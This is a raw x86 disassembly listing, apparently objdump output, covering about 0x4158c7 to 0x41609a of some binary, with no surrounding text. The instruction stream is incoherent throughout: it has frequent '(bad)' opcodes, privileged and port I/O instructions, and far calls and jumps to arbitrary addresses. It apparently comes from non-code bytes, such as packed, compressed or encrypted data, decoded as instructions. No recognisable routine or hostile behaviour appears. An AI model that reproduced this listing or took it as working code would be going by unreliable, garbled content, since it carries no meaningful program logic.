  4158c7:	sbb    al,0x6b
  4158c9:	xchg   ebx,eax
  4158ca:	dec    esp
  4158cb:	sub    bl,ah
  4158cd:	sahf   
  4158ce:	jno    0x415947
  4158d0:	or     BYTE PTR [edx],bh
  4158d2:	hlt    
  4158d3:	push   0x3e
  4158d5:	(bad)  
  4158d6:	mov    ebx,0x34f12b6e
  4158db:	xchg   esp,eax
  4158dc:	add    eax,0x75573ac3
  4158e1:	retf   
  4158e2:	mov    ecx,0x8480cce1
  4158e7:	inc    edi
  4158e8:	mov    eax,0x83050f1d
  4158ed:	(bad)  
  4158ee:	addr16 adc ax,0x3cbd
  4158f3:	in     eax,dx
  4158f4:	test   al,0xec
  4158f6:	in     al,0x28
  4158f8:	adc    al,0x3a
  4158fa:	add    ch,BYTE PTR [eax-0x2]
  4158fd:	jae    0x415949
  4158ff:	imul   ebx,eax,0x6b
  415902:	lahf   
  415903:	stos   DWORD PTR es:[edi],eax
  415904:	out    dx,al
  415905:	and    DWORD PTR [esi-0x22],0x76
  415909:	or     BYTE PTR [edx-0x40aa956b],dh
  41590f:	adc    BYTE PTR [ecx+0x7e29cc4f],0x9a
  415916:	push   cs
  415917:	setg   dh
  41591a:	mov    DWORD PTR [ebx],eax
  41591c:	call   0x1df4baf4
  415921:	icebp  
  415922:	xor    al,0x81
  415924:	aad    0x1b
  415926:	jle    0x41598e
  415928:	daa    
  415929:	pop    eax
  41592a:	adc    dh,bh
  41592c:	fbld   TBYTE PTR [edi+0x33]
  41592f:	jg     0x41598e
  415931:	adc    eax,0x49861986
  415936:	fisttp DWORD PTR [eax]
  415938:	inc    edx
  415939:	inc    esp
  41593a:	xchg   ecx,ebp
  41593c:	pusha  
  41593d:	push   edi
  41593e:	sbb    al,0x99
  415940:	fwait
  415941:	and    BYTE PTR [ebx+0x7dea6228],ch
  415947:	add    esi,DWORD PTR [ecx]
  415949:	int3   
  41594a:	ficom  DWORD PTR [edi]
  41594c:	or     DWORD PTR [edi+0x730097ce],edi
  415952:	repnz leave 
  415954:	mov    ds:0x671070b7,eax
  415959:	inc    eax
  41595a:	out    dx,al
  41595b:	test   al,0x37
  41595d:	dec    esi
  41595e:	call   0x86cb446f
  415963:	mov    ebx,0xe3e2602f
  415968:	jge    0x415949
  41596a:	inc    edx
  41596b:	sub    DWORD PTR [edi],ecx
  41596d:	or     ecx,DWORD PTR [eax+0x3f0a1e2b]
  415973:	cs addr16 icebp 
  415976:	inc    ebp
  415977:	xchg   ebx,eax
  415978:	push   edi
  415979:	and    ah,BYTE PTR [edx-0x230e3f8d]
  41597f:	aam    0x6
  415981:	jg     0x4159b2
  415983:	mov    ds:0x94fe4ed9,eax
  415988:	stos   DWORD PTR es:[edi],eax
  415989:	int    0x86
  41598b:	push   ecx
  41598c:	cs pushf 
  41598e:	int    0x36
  415990:	inc    ebp
  415991:	xchg   edi,eax
  415992:	mov    ah,0x2f
  415994:	fdiv   DWORD PTR [ebp-0x6d]
  415997:	and    edi,edi
  415999:	push   ecx
  41599a:	jne    0x415968
  41599c:	test   DWORD PTR [edi-0x69],0xcdbc2958
  4159a3:	dec    DWORD PTR [edi-0x4d502b06]
  4159a9:	inc    esi
  4159aa:	mov    al,ds:0x1388a3ee
  4159af:	test   eax,0x7d4e41ff
  4159b4:	xchg   esi,eax
  4159b5:	add    DWORD PTR [ebx+eax*4+0x2b497dc3],0xe
  4159bd:	repz sbb WORD PTR [ecx],cx
  4159c1:	mov    bl,0x30
  4159c3:	or     bh,BYTE PTR [eax+ebp*1]
  4159c6:	stos   DWORD PTR es:[edi],eax
  4159c7:	arpl   WORD PTR [ecx],cx
  4159c9:	lods   al,BYTE PTR ds:[esi]
  4159ca:	jl     0x4159f9
  4159cc:	push   esp
  4159cd:	ret    
  4159ce:	jmp    0x8aaec89
  4159d3:	and    dh,BYTE PTR [edx]
  4159d5:	lock cs cld 
  4159d8:	push   edx
  4159d9:	js     0x4159d8
  4159db:	into   
  4159dc:	mov    ds:0xa9958594,eax
  4159e1:	pop    eax
  4159e2:	xchg   bl,ah
  4159e4:	int    0xaf
  4159e6:	test   edx,eax
  4159e8:	sub    edi,ebp
  4159ea:	jecxz  0x415a2b
  4159ec:	or     DWORD PTR [ecx-0x5b03636],ecx
  4159f2:	call   0x54cf:0x87598544
  4159f9:	fisttp WORD PTR [ebx+0x72817d67]
  4159ff:	sub    BYTE PTR [edx-0x37],bl
  415a02:	jo     0x415a3e
  415a04:	push   ds
  415a05:	jb     0x415a04
  415a07:	pop    ss
  415a08:	mov    dl,0x1e
  415a0a:	xchg   BYTE PTR [eax],bl
  415a0c:	loopne 0x415991
  415a0e:	xchg   eax,edi
  415a10:	adc    eax,0x126e06e2
  415a15:	icebp  
  415a16:	bound  eax,QWORD PTR [ebp-0x3d]
  415a19:	xchg   edx,eax
  415a1a:	mov    cl,0xf9
  415a1c:	push   ecx
  415a1d:	cmp    ch,BYTE PTR [edi+0x231a5129]
  415a23:	iret   
  415a24:	or     DWORD PTR [eax],ebp
  415a26:	sub    eax,0xb42eee8
  415a2b:	dec    esi
  415a2c:	leave  
  415a2d:	icebp  
  415a2e:	out    0x50,al
  415a30:	jnp    0x415a67
  415a32:	mov    bl,0x6a
  415a34:	xlat   BYTE PTR ds:[ebx]
  415a35:	call   0xb993e01c
  415a3a:	icebp  
  415a3b:	jg     0x415a63
  415a3d:	sahf   
  415a3e:	adc    al,0x8b
  415a40:	sbb    BYTE PTR [edi+eax*4+0xcf167e9],al
  415a47:	mov    bl,0x6a
  415a49:	cwde   
  415a4a:	pop    ebx
  415a4b:	or     BYTE PTR [ecx-0x5c],dh
  415a4e:	pop    esp
  415a4f:	or     BYTE PTR [ebp-0x2876790e],bl
  415a55:	and    eax,ecx
  415a57:	mov    ds:0x844f114,al
  415a5c:	mov    ecx,0xff21220e
  415a61:	pop    edx
  415a62:	cmp    al,0x9
  415a64:	popf   
  415a65:	dec    eax
  415a66:	xchg   DWORD PTR [ebx],ebp
  415a68:	(bad)  
  415a69:	mov    ch,0x11
  415a6b:	pop    esi
  415a6c:	pop    ebx
  415a6d:	call   0xe27c:0x19e42966
  415a74:	push   cs
  415a75:	(bad)  
  415a76:	scas   al,BYTE PTR es:[edi]
  415a77:	in     eax,dx
  415a78:	mov    bl,0x1f
  415a7a:	mov    ds:0xf4a0212,al
  415a7f:	pop    eax
  415a80:	lds    edx,FWORD PTR [eax-0x6014d7b3]
  415a86:	pop    edx
  415a87:	jmp    0x415a91
  415a89:	loop   0x415af7
  415a8b:	cmp    eax,0xdb76d710
  415a90:	retf   0xe4f0
  415a93:	mov    cl,0x5c
  415a95:	stos   DWORD PTR es:[edi],eax
  415a96:	int3   
  415a97:	ins    DWORD PTR es:[edi],dx
  415a98:	sahf   
  415a99:	rcl    DWORD PTR [edi-0x50f2601],1
  415a9f:	adc    eax,0x83e27e23
  415aa4:	imul   esi,ecx,0x64a362b4
  415aaa:	iret   
  415aab:	inc    esi
  415aac:	add    esi,DWORD PTR [ecx]
  415aae:	iret   
  415aaf:	sbb    DWORD PTR [eax],ecx
  415ab1:	sbb    bl,BYTE PTR [edx+0x34]
  415ab4:	or     edi,DWORD PTR [esi-0xf0256cc]
  415aba:	sbb    dl,bl
  415abc:	mov    bl,0x44
  415abe:	xor    DWORD PTR [esi],ecx
  415ac0:	test   dl,dh
  415ac2:	jmp    0x87b6a6c1
  415ac7:	mov    bl,0x9b
  415ac9:	xor    eax,0x80a84473
  415ace:	push   esp
  415acf:	call   0x90204441
  415ad4:	or     al,ch
  415ad6:	imul   edi,DWORD PTR [esi],0x11
  415ad9:	or     al,0x62
  415adb:	add    ebp,DWORD PTR [edx-0x14]
  415ade:	xchg   BYTE PTR [edx-0x55],dl
  415ae1:	(bad)  
  415ae2:	mov    ecx,0x61872bce
  415ae7:	sub    BYTE PTR [eax-0x6e],dl
  415aea:	xchg   ecx,eax
  415aeb:	lods   al,BYTE PTR ds:[esi]
  415aec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415aed:	push   es
  415aee:	stc    
  415aef:	shl    DWORD PTR [ecx+ebx*1+0x5fc90185],cl
  415af6:	es dec edi
  415af8:	in     al,0x6
  415afa:	inc    esi
  415afb:	ss pop ebx
  415afd:	clc    
  415afe:	cmp    BYTE PTR [ecx],ch
  415b00:	mov    eax,0xf72a318e
  415b05:	iret   
  415b06:	jle    0x415b0d
  415b08:	in     al,dx
  415b09:	adc    bh,bh
  415b0b:	lods   eax,DWORD PTR ds:[esi]
  415b0c:	add    al,0x88
  415b0e:	sahf   
  415b0f:	retf   0x3009
  415b12:	call   0xe30f9458
  415b17:	mov    esp,0xa84d58f7
  415b1c:	in     al,dx
  415b1d:	in     eax,dx
  415b1e:	mov    ecx,edx
  415b20:	call   0x98eb87b2
  415b25:	icebp  
  415b26:	out    0x27,al
  415b28:	nop
  415b29:	aad    0xfb
  415b2b:	jo     0x415b08
  415b2d:	ret    0xf8e8
  415b30:	jge    0x415b7a
  415b32:	push   0x6bd2e61f
  415b37:	adc    DWORD PTR [ecx],edi
  415b39:	add    BYTE PTR [edi+0x5eff17a5],al
  415b3f:	push   ebp
  415b40:	ins    DWORD PTR es:[edi],dx
  415b41:	adc    DWORD PTR [edx+0x31],eax
  415b44:	cmc    
  415b45:	pop    ecx
  415b46:	es dec eax
  415b48:	or     BYTE PTR [esp+esi*8-0x7db0726d],ah
  415b4f:	pop    edi
  415b50:	jmp    0xc2f1:0x47bdcccc
  415b57:	out    0x85,eax
  415b59:	mov    eax,0x6085825
  415b5e:	jno    0x415b89
  415b60:	mov    ah,0x2c
  415b62:	dec    ebp
  415b63:	sub    ch,al
  415b65:	push   DWORD PTR [esi+0x6b]
  415b68:	out    0xcd,eax
  415b6a:	repz test ax,0x2ce4
  415b6f:	enter  0x8c07,0x16
  415b73:	xchg   ecx,eax
  415b74:	cmp    dl,bl
  415b76:	mov    eax,ds:0xe7c4fc64
  415b7b:	cmp    DWORD PTR [ebp+0x42c4aaf3],0xbea49b57
  415b85:	das    
  415b86:	(bad)  
  415b87:	sahf   
  415b88:	ror    al,0x46
  415b8b:	push   eax
  415b8c:	arpl   cx,si
  415b8e:	jo     0x415bf0
  415b90:	sbb    al,0x2a
  415b92:	inc    esi
  415b93:	sti    
  415b94:	or     esi,ecx
  415b96:	inc    ecx
  415b97:	mov    edi,0xaf1c5026
  415b9c:	sub    esi,ecx
  415b9e:	jo     0x415b75
  415ba0:	cmp    ah,BYTE PTR fs:[edi+0x4bc27690]
  415ba7:	ret    0x4808
  415baa:	jnp    0x415b2d
  415bac:	ins    BYTE PTR es:[edi],dx
  415bad:	adc    edi,ebp
  415baf:	mov    al,ds:0xc30af0e1
  415bb4:	int    0xcd
  415bb6:	scas   al,BYTE PTR es:[edi]
  415bb7:	js     0x415bc9
  415bb9:	in     al,dx
  415bba:	(bad)  
  415bbb:	inc    esi
  415bbc:	je     0x415ba2
  415bbe:	jg     0x415bae
  415bc0:	xor    BYTE PTR [ecx-0x5188d15d],ch
  415bc6:	dec    ebx
  415bc7:	cmp    ecx,DWORD PTR [ebx-0x4397da9e]
  415bcd:	lock push es
  415bcf:	mov    BYTE PTR [ecx-0x61c4c83],0xe7
  415bd6:	test   al,0xec
  415bd8:	(bad)  
  415bd9:	lock icebp 
  415bdb:	dec    edi
  415bdc:	sub    BYTE PTR [esi-0x6b],dh
  415bdf:	fcomip st,st(6)
  415be1:	nop
  415be2:	xchg   esi,eax
  415be3:	lock fs xchg edi,eax
  415be6:	mov    ebp,0x6980050e
  415beb:	daa    
  415bec:	add    DWORD PTR [edi-0x42],edi
  415bef:	inc    ecx
  415bf0:	mov    ebx,0x401667a
  415bf5:	icebp  
  415bf6:	xor    dh,bl
  415bf8:	mov    eax,ds:0x4eac0553
  415bfd:	sub    eax,0xa743cf26
  415c02:	xchg   BYTE PTR [ecx+0x73],dl
  415c05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c07:	repnz and eax,0x590cb6c6
  415c0d:	pop    esi
  415c0e:	lods   eax,DWORD PTR ds:[esi]
  415c0f:	sub    DWORD PTR [edi+0x16],esi
  415c12:	xor    WORD PTR [edx+0x52491ef1],0xff96
  415c1a:	push   esi
  415c1b:	mov    eax,0x830f150
  415c20:	mov    dh,0xc3
  415c22:	rcr    DWORD PTR [ebp-0x49e60b9e],1
  415c28:	nop
  415c29:	jp     0x415bb1
  415c2b:	inc    ebx
  415c2c:	ret    0x53c9
  415c2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c30:	pop    edi
  415c31:	jg     0x415c2b
  415c33:	sub    DWORD PTR [edx],ebx
  415c35:	adc    eax,0x9008fa8f
  415c3a:	mov    bl,cl
  415c3c:	(bad)  
  415c3d:	jl     0x415bd6
  415c3f:	scas   al,BYTE PTR es:[edi]
  415c40:	push   cs
  415c41:	out    dx,eax
  415c42:	enter  0x38c7,0xbd
  415c46:	jecxz  0x415c8b
  415c48:	sbb    esp,DWORD PTR [edx]
  415c4a:	inc    esp
  415c4b:	mov    bh,0x49
  415c4d:	ins    DWORD PTR es:[edi],dx
  415c4e:	or     BYTE PTR [ecx-0x2f],ch
  415c51:	stos   DWORD PTR es:[edi],eax
  415c52:	adc    edi,ecx
  415c54:	mov    dh,BYTE PTR [ebx-0x7a]
  415c57:	aad    0x35
  415c59:	xor    eax,0xbbe1c3eb
  415c5e:	xchg   ecx,ebp
  415c60:	imul   ecx,DWORD PTR [ecx+0x6095878c],0x2e
  415c67:	sub    DWORD PTR [esi+ecx*4+0x412744cf],esp
  415c6e:	repnz test ebx,0xfe26a301
  415c75:	mov    al,0xf0
  415c77:	pop    ss
  415c78:	cmp    ecx,DWORD PTR [edi-0x1fa8fc58]
  415c7e:	xchg   BYTE PTR [ecx-0x2f],dl
  415c81:	adc    eax,0x2b5b250d
  415c86:	inc    eax
  415c87:	sub    edi,eax
  415c89:	or     DWORD PTR [edx-0x3168087e],0x8dde2d00
  415c93:	pop    ebx
  415c94:	das    
  415c95:	icebp  
  415c96:	mov    esp,0x911017d6
  415c9b:	mov    WORD PTR [edx+ebx*8],?
  415c9e:	cli    
  415c9f:	pop    esp
  415ca0:	mov    dl,0xf0
  415ca2:	(bad)  
  415ca3:	jae    0x415c99
  415ca5:	or     BYTE PTR [eax],dh
  415ca7:	pop    es
  415ca8:	pop    ebx
  415ca9:	mul    BYTE PTR [edx+0xc64e094]
  415caf:	dec    ebx
  415cb0:	fdiv   DWORD PTR [edi]
  415cb2:	mov    esi,esp
  415cb4:	xlat   BYTE PTR ds:[ebx]
  415cb5:	sbb    DWORD PTR [ebp+0xf],ebp
  415cb8:	aaa    
  415cb9:	cmp    al,0xa9
  415cbb:	in     eax,dx
  415cbc:	or     BYTE PTR [ebx-0x43],dh
  415cbf:	adc    eax,0x6ddb88cf
  415cc4:	adc    esp,DWORD PTR [eax]
  415cc6:	sbb    DWORD PTR [eax],ebp
  415cc8:	jp     0x415c92
  415cca:	rol    DWORD PTR [esi+0x8],1
  415ccd:	xchg   esp,eax
  415cce:	or     dh,bh
  415cd0:	sub    DWORD PTR [ebp-0x2ea4eb34],esp
  415cd6:	jno    0x415c8a
  415cd8:	ffreep st(3)
  415cda:	jnp    0x415d05
  415cdc:	clc    
  415cdd:	out    0x7d,eax
  415cdf:	(bad)  
  415ce0:	imul   DWORD PTR [ecx-0x60]
  415ce3:	cmp    BYTE PTR ds:0xfaca5926,dh
  415ce9:	icebp  
  415cea:	lock and cl,0xf2
  415cee:	test   al,0xe9
  415cf0:	adc    eax,0x61a2c0b
  415cf5:	and    bh,BYTE PTR [edi+eiz*1+0x57]
  415cf9:	mov    dl,0xdb
  415cfb:	test   DWORD PTR [ecx-0x6c62b8ff],esi
  415d01:	fwait
  415d02:	jae    0x415d2d
  415d04:	mov    dh,BYTE PTR [ebx+0x1cf69fd2]
  415d0a:	ins    BYTE PTR es:[edi],dx
  415d0b:	in     al,0x9
  415d0d:	pushf  
  415d0e:	popa   
  415d0f:	imul   DWORD PTR [ebp+ebp*2-0xe6e7204]
  415d16:	cld    
  415d17:	ds bnd ret 
  415d1a:	push   esp
  415d1b:	xor    BYTE PTR [esi],ah
  415d1d:	lahf   
  415d1e:	(bad)  
  415d1f:	pop    ds
  415d20:	mov    eax,ds:0xa4b786b8
  415d25:	xchg   ecx,eax
  415d26:	xor    BYTE PTR [esi-0xd],dl
  415d29:	mov    al,0x9
  415d2b:	daa    
  415d2c:	pusha  
  415d2d:	lock pusha 
  415d2f:	arpl   WORD PTR [ecx+0x68],cx
  415d32:	mov    cl,0xea
  415d34:	test   ah,bh
  415d36:	xchg   ecx,edx
  415d38:	addr16 adc eax,0x8ad9c8a8
  415d3e:	dec    edx
  415d3f:	sub    BYTE PTR [edx+0x3574b250],dh
  415d45:	inc    esp
  415d46:	jmp    0x665:0x72080815
  415d4d:	or     al,0xe
  415d4f:	in     al,0x87
  415d51:	scas   al,BYTE PTR es:[edi]
  415d52:	(bad)  
  415d53:	sub    DWORD PTR [edx+0x54],edi
  415d56:	or     al,0x6b
  415d58:	not    DWORD PTR [edi]
  415d5a:	clc    
  415d5b:	pop    es
  415d5c:	je     0x415d82
  415d5e:	lods   al,BYTE PTR ds:[esi]
  415d5f:	mov    ebx,DWORD PTR [edx]
  415d61:	icebp  
  415d62:	pop    esi
  415d63:	iret   
  415d64:	retf   
  415d65:	lds    edi,FWORD PTR [esi+0x4c]
  415d68:	fs call 0x587:0x31a93fbb
  415d70:	dec    ecx
  415d71:	cmp    al,0x98
  415d73:	cmp    ah,BYTE PTR [ebp-0x2cd7076a]
  415d79:	aad    0xd5
  415d7b:	and    cl,BYTE PTR [eax]
  415d7d:	xchg   edx,eax
  415d7e:	inc    esi
  415d7f:	mov    edi,0x75babf5
  415d84:	pop    ebp
  415d85:	lock add al,0x75
  415d88:	or     DWORD PTR [bp+si],0x9447a952
  415d8f:	hlt    
  415d90:	outs   dx,BYTE PTR ds:[esi]
  415d91:	xchg   esp,eax
  415d92:	xchg   DWORD PTR ds:0x2ca19985,ebp
  415d98:	mov    eax,ds:0xa3283b9b
  415d9d:	cmp    edx,ebp
  415d9f:	gs or  ebp,esp
  415da2:	scas   eax,DWORD PTR es:[edi]
  415da3:	jmp    0x415da8
  415da5:	int3   
  415da6:	xchg   ebx,eax
  415da7:	xor    al,0xe8
  415da9:	mov    bh,0xe1
  415dab:	cmp    BYTE PTR [ebp-0x52cb61bb],ch
  415db1:	and    DWORD PTR [edi],esp
  415db3:	repnz mov ecx,0xcc2f16c2
  415db9:	add    cl,ch
  415dbb:	idiv   DWORD PTR [esi]
  415dbd:	icebp  
  415dbe:	je     0x415e32
  415dc0:	xor    al,0x9d
  415dc2:	out    0xf3,al
  415dc4:	mov    esp,0xcfcdb747
  415dc9:	mov    bh,0x80
  415dcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dcc:	mov    dl,BYTE PTR [ecx]
  415dce:	sbb    eax,0xe8f1ebf1
  415dd3:	jo     0x415d5f
  415dd5:	jo     0x415e16
  415dd7:	add    ch,BYTE PTR [edx+eiz*4-0x36]
  415ddb:	inc    ecx
  415ddc:	jmp    0x415dcf
  415dde:	repz or DWORD PTR [edi+eax*4+0xbf319c8],0xc
  415de7:	mov    cl,0x25
  415de9:	cmc    
  415dea:	jbe    0x415e14
  415dec:	jmp    0x415dc5
  415dee:	mov    bh,0x4b
  415df0:	jno    0x415da4
  415df2:	mov    esi,0xb3a67c3d
  415df7:	daa    
  415df8:	dec    ecx
  415df9:	stc    
  415dfa:	and    eax,0xeef069c6
  415dff:	mov    eax,ds:0x866f03f2
  415e04:	push   edi
  415e05:	inc    ecx
  415e06:	jns    0x415e6c
  415e08:	(bad)  
  415e09:	neg    bh
  415e0b:	ins    DWORD PTR es:[edi],dx
  415e0c:	sahf   
  415e0d:	xchg   ebp,eax
  415e0e:	lock xor eax,0xee4414af
  415e14:	sub    eax,ebx
  415e16:	and    eax,0x85fe5d98
  415e1b:	sub    ah,ah
  415e1d:	test   BYTE PTR [esi-0x4d],ah
  415e20:	not    DWORD PTR ds:0xf4ee49c7
  415e26:	rcl    DWORD PTR cs:[ebp+0x8207480],cl
  415e2d:	mov    ds:0xb6e54ebd,eax
  415e32:	sub    eax,DWORD PTR [edi+0x67259468]
  415e38:	iret   
  415e39:	sbb    edi,DWORD PTR [eax+0x64]
  415e3c:	cdq    
  415e3d:	adc    eax,0xcd2627c4
  415e42:	xor    edx,DWORD PTR [ecx]
  415e44:	mov    ah,0x71
  415e46:	push   es
  415e47:	sub    BYTE PTR [edi],al
  415e49:	push   es
  415e4a:	fnstenv [eax+0x2b955e00]
  415e50:	sti    
  415e51:	push   cs
  415e52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e53:	jno    0x415e34
  415e55:	icebp  
  415e56:	jbe    0x415e3a
  415e58:	inc    ebx
  415e59:	ror    BYTE PTR [ebx-0x7b],0xe4
  415e5d:	cmp    eax,edx
  415e5f:	int3   
  415e60:	or     BYTE PTR [esi],cl
  415e62:	pusha  
  415e63:	sbb    edx,DWORD PTR [esi+0x6]
  415e66:	adc    eax,0xdcf0e624
  415e6b:	aad    0xe2
  415e6d:	into   
  415e6e:	in     al,dx
  415e6f:	add    ebp,edi
  415e71:	push   edx
  415e72:	rcr    DWORD PTR [esi],0xf9
  415e75:	ds push 0xffffffef
  415e78:	popa   
  415e79:	(bad)  
  415e7a:	idiv   BYTE PTR [ebx+0x29df0060]
  415e80:	sbb    al,0xaa
  415e82:	mov    BYTE PTR ds:0x27bbb7a5,cl
  415e88:	imul   esi,DWORD PTR [ecx-0xd],0x78f2958e
  415e8f:	cmp    ecx,DWORD PTR [esi+0x1e3d87ce]
  415e95:	lds    edi,FWORD PTR [edx]
  415e97:	pop    ebx
  415e98:	inc    edi
  415e99:	rcl    bh,1
  415e9b:	call   0x2a8b180b
  415ea0:	push   DWORD PTR [edx+eiz*8-0x51e3aa41]
  415ea7:	nop
  415ea8:	test   DWORD PTR [ebp+0x4e],0x800ec052
  415eaf:	adc    BYTE PTR [esi-0xf],bl
  415eb2:	push   cs
  415eb3:	push   esi
  415eb4:	dec    edx
  415eb5:	repnz rcl DWORD PTR [edx+0x34],0x8b
  415eba:	pop    edx
  415ebb:	(bad)  
  415ebc:	icebp  
  415ebd:	lock not DWORD PTR [edi-0x4b]
  415ec1:	bound  ebp,QWORD PTR [edi-0x59]
  415ec4:	dec    eax
  415ec5:	lock jle 0x415f12
  415ec8:	and    BYTE PTR [edx-0x4839bae1],0x33
  415ecf:	ret    0x4369
  415ed2:	test   ebp,eax
  415ed4:	mov    edx,0x595e4c4c
  415ed9:	mov    eax,0x55e5a958
  415ede:	fsubp  st(2),st
  415ee0:	out    0xd4,al
  415ee2:	cmp    BYTE PTR [edi+0x330730bc],0x2a
  415ee9:	lock mov edx,0x7ecb9cfe
  415eef:	hlt    
  415ef0:	jo     0x415ef0
  415ef2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ef3:	aam    0x60
  415ef5:	jne    0x337a4f7a
  415efb:	sub    eax,edi
  415efd:	xchg   ecx,eax
  415efe:	jne    0x415efe
  415f00:	mov    cl,0x72
  415f02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f03:	sub    DWORD PTR [eax+0x94bb817],edi
  415f09:	inc    esp
  415f0a:	inc    ecx
  415f0b:	lods   al,BYTE PTR ds:[esi]
  415f0c:	mov    esi,0x50d2a292
  415f11:	icebp  
  415f12:	retf   0x3edc
  415f15:	es pop ebx
  415f17:	fisttp WORD PTR [edi]
  415f19:	adc    al,0xec
  415f1b:	sbb    ebx,0x52
  415f1e:	xchg   DWORD PTR [edi],eax
  415f20:	imul   esi,DWORD PTR [ebx-0x44]
  415f24:	xor    eax,0xc229d52e
  415f29:	mov    esi,0x8c3664d2
  415f2e:	lods   al,BYTE PTR ds:[esi]
  415f2f:	je     0x415fae
  415f31:	icebp  
  415f32:	cmp    BYTE PTR [eax+0x33],bh
  415f35:	ins    BYTE PTR es:[edi],dx
  415f36:	dec    esp
  415f37:	loopne 0x415f01
  415f39:	test   DWORD PTR [eax+0x10],eax
  415f3c:	or     BYTE PTR [ecx],al
  415f3e:	lods   eax,DWORD PTR ds:[esi]
  415f3f:	pop    ebp
  415f40:	add    DWORD PTR [edi-0x43],ebp
  415f43:	repnz lldt WORD PTR [edx-0x454e9f43]
  415f4b:	mov    cl,0x79
  415f4d:	and    esp,DWORD PTR [eax-0x77]
  415f50:	xchg   ecx,esi
  415f52:	add    ch,dh
  415f54:	or     ebp,DWORD PTR [esi-0x54]
  415f57:	fild   DWORD PTR [ebx-0x13]
  415f5a:	jmp    FWORD PTR [edi+0x13]
  415f5d:	inc    eax
  415f5e:	test   BYTE PTR [esi],0xf8
  415f61:	mov    cl,0x73
  415f63:	dec    eax
  415f64:	push   ebp
  415f65:	mov    WORD PTR [ecx+0x8],es
  415f68:	add    esi,DWORD PTR [edi-0x51]
  415f6b:	pop    edx
  415f6c:	arpl   WORD PTR [edx-0x7a],di
  415f6f:	and    al,BYTE PTR [ebx]
  415f71:	pop    edi
  415f72:	add    DWORD PTR [ecx+0x3d861850],ebp
  415f78:	int3   
  415f79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f7a:	mov    edi,0x1500210b
  415f7f:	das    
  415f80:	icebp  
  415f81:	cmp    dl,BYTE PTR [ebp+0x46af280e]
  415f87:	out    dx,al
  415f88:	pop    ecx
  415f89:	icebp  
  415f8a:	repz scas eax,DWORD PTR es:[edi]
  415f8c:	dec    ebp
  415f8d:	push   ebx
  415f8e:	sbb    DWORD PTR [ecx+eiz*2],ebp
  415f91:	lock dec eax
  415f93:	test   al,0x7d
  415f95:	cwde   
  415f96:	fcmovnbe st,st(5)
  415f98:	cmp    edx,DWORD PTR [edi]
  415f9a:	test   eax,0x872180fc
  415f9f:	in     eax,dx
  415fa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fa1:	jnp    0x415fc3
  415fa3:	mov    ebp,0xc0228fd0
  415fa8:	or     BYTE PTR [ecx+0x44],ah
  415fab:	dec    edi
  415fac:	sub    esp,DWORD PTR [ebx+0x5d]
  415faf:	xor    al,0x35
  415fb1:	mov    dl,0xf9
  415fb3:	js     0x415f53
  415fb5:	js     0x416018
  415fb7:	pusha  
  415fb8:	ds (bad) 
  415fba:	mov    ecx,0xd4f1b028
  415fbf:	xor    BYTE PTR [edi-0x3ac57aef],al
  415fc5:	fimul  DWORD PTR [ebx-0x67eb2fa5]
  415fcb:	repz cdq 
  415fcd:	aam    0xb8
  415fcf:	imul   esi,DWORD PTR [edi],0xd926e20f
  415fd5:	in     al,dx
  415fd6:	or     cl,dh
  415fd8:	pop    ds
  415fd9:	push   esi
  415fda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fdb:	push   ecx
  415fdc:	rcl    BYTE PTR [edx],1
  415fde:	dec    ecx
  415fdf:	dec    ecx
  415fe0:	adc    BYTE PTR [ecx],0x79
  415fe3:	ror    DWORD PTR [ecx],0x70
  415fe6:	add    bh,ch
  415fe8:	aaa    
  415fe9:	add    dh,BYTE PTR [ebp-0x47]
  415fec:	mov    edi,0x2defa0f0
  415ff1:	sbb    esi,DWORD PTR [esi]
  415ff3:	push   edi
  415ff4:	sub    esp,DWORD PTR [esi]
  415ff6:	xchg   ebp,eax
  415ff7:	js     0x415faa
  415ff9:	mov    dl,0x86
  415ffb:	sbb    DWORD PTR [esi-0x56248115],esi
  416001:	pusha  
  416002:	call   FWORD PTR [eax-0x66]
  416005:	sbb    BYTE PTR [esi+0x8e1c1e],al
  41600b:	pop    ebx
  41600c:	cmp    eax,0x8a6382c2
  416011:	xor    eax,0x39277dad
  416016:	pop    es
  416017:	sub    ah,dl
  416019:	lock and al,BYTE PTR [eax+ebp*1]
  41601d:	enter  0x44b0,0x5f
  416021:	adc    dh,BYTE PTR [eax-0x28]
  416024:	scas   al,BYTE PTR es:[edi]
  416025:	push   ebx
  416026:	into   
  416027:	(bad)  
  416028:	or     al,0x6d
  41602a:	mov    edi,0x6d31f1fd
  41602f:	out    dx,eax
  416030:	sbb    ecx,esi
  416032:	or     bl,BYTE PTR [ebx-0x57]
  416035:	aam    0x18
  416037:	jmp    0xe3608690
  41603c:	fdivr  QWORD PTR [edx+0x427c3986]
  416042:	cdq    
  416043:	add    al,0xc3
  416045:	fcmovnu st,st(6)
  416047:	sub    DWORD PTR ds:0x7ebe3846,ecx
  41604d:	scas   al,BYTE PTR es:[edi]
  41604e:	jno    0x415ff0
  416050:	dec    eax
  416051:	adc    BYTE PTR [ebx-0x9133fd8],al
  416057:	stos   BYTE PTR es:[edi],al
  416058:	fistp  QWORD PTR [edx+esi*1-0x5cbcb6c9]
  41605f:	mov    esp,0x7b5a800e
  416064:	mov    esp,DWORD PTR [edi-0x79]
  416067:	mov    bl,0x4b
  416069:	and    DWORD PTR [ecx+eiz*8-0x239cdf76],eax
  416070:	jb     0x416002
  416072:	mov    ds:0xb10e08be,eax
  416077:	dec    edx
  416078:	lahf   
  416079:	out    0x67,al
  41607b:	ret    
  41607c:	leave  
  41607d:	lock lock popf 
  416080:	es out dx,eax
  416082:	hlt    
  416083:	test   eax,0xbb76297e
  416088:	mov    WORD PTR [ecx-0x7a],es
  41608b:	dec    ecx
  41608c:	fsubr  QWORD PTR [edx+0x13]
  41608f:	xchg   ecx,eax
  416090:	mov    DWORD PTR [edi-0xd],eax
  416093:	sub    BYTE PTR [ecx],ah
  416095:	mov    edx,0x8830cdbf
  41609a:	cmp    BYTE PTR [eax+ecx*1+0x33],0x82
